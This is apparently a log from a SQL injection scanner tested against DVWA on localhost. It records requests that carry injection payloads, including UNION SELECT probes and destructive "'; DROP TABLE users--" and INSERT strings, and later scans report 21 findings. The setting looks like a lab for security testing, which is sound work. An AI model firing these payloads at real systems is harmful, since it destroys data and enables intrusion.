[2026-04-07 07:37:36] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+UNION+SELECT+NULL%2CNULL--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:36] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+UNION+SELECT+NULL%2CNULL--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:40] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+UNION+SELECT+NULL%2CNULL%2CNULL-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:40] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+UNION+SELECT+NULL%2CNULL%2CNULL-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:40] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+UNION+SELECT+NULL%2CNULL%2CNULL--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:40] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+UNION+SELECT+NULL%2CNULL%2CNULL--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:45] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%3B+DROP+TABLE+users-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:45] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%3B+DROP+TABLE+users-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:45] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%3B+DROP+TABLE+users--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:45] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%3B+DROP+TABLE+users--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:49] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%3B+INSERT+INTO+users+VALUES%281%29-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:49] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%3B+INSERT+INTO+users+VALUES%281%29-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:49] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%3B+INSERT+INTO+users+VALUES%281%29--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:49] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%3B+INSERT+INTO+users+VALUES%281%29--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:54] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:54] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:54] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:54] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:59] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%23 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:59] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%23 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:59] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%23&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:59] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%23&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:38:03] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%2F%2A (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:38:03] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%2F%2A (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:38:03] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%2F%2A&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:38:03] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%2F%2A&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:38:03] INFO     
=======================================================
[2026-04-07 07:38:03] INFO     
=======================================================
[2026-04-07 07:38:03] INFO       SCAN COMPLETE
[2026-04-07 07:38:03] INFO       SCAN COMPLETE
[2026-04-07 07:38:03] INFO       URLs scanned    : 1
[2026-04-07 07:38:03] INFO       URLs scanned    : 1
[2026-04-07 07:38:03] INFO       Vulnerabilities : 0
[2026-04-07 07:38:03] INFO       Vulnerabilities : 0
[2026-04-07 07:38:03] INFO       Results saved   : sqli_results.json
[2026-04-07 07:38:03] INFO       Results saved   : sqli_results.json
[2026-04-07 07:38:03] INFO       Log saved       : sqli_scan.log
[2026-04-07 07:38:03] INFO       Log saved       : sqli_scan.log
[2026-04-07 07:38:03] INFO     =======================================================
[2026-04-07 07:38:03] INFO     =======================================================
[2026-04-07 11:40:28] INFO     Cookies loaded: PHPSESSID=atpunq4qmv2sttt5fcu71mu676; security=low
[2026-04-07 11:40:28] INFO     Scanning http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit | Parameters: ['id', 'Submit']
[2026-04-07 11:40:44] INFO     
=======================================================
[2026-04-07 11:40:44] INFO       SCAN COMPLETE
[2026-04-07 11:40:44] INFO       URLs scanned    : 1
[2026-04-07 11:40:44] INFO       Vulnerabilities : 21
[2026-04-07 11:40:44] INFO       Results saved   : sqli_results.json
[2026-04-07 11:40:44] INFO       Log saved       : sqli_scan.log
[2026-04-07 11:40:44] INFO     =======================================================
[2026-04-07 13:41:17] INFO     Cookies loaded: PHPSESSID=atpunq4qmv2sttt5fcu71mu676; security=low
[2026-04-07 13:41:17] INFO     Scanning http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit | Parameters: ['id', 'Submit']
[2026-04-07 13:41:33] INFO     
=======================================================
[2026-04-07 13:41:33] INFO       SCAN COMPLETE
[2026-04-07 13:41:33] INFO       URLs scanned    : 1
[2026-04-07 13:41:33] INFO       Vulnerabilities : 21
[2026-04-07 13:41:33] INFO       Results saved   : sqli_results.json
[2026-04-07 13:41:33] INFO       Log saved       : sqli_scan.log
[2026-04-07 13:41:33] INFO     =======================================================
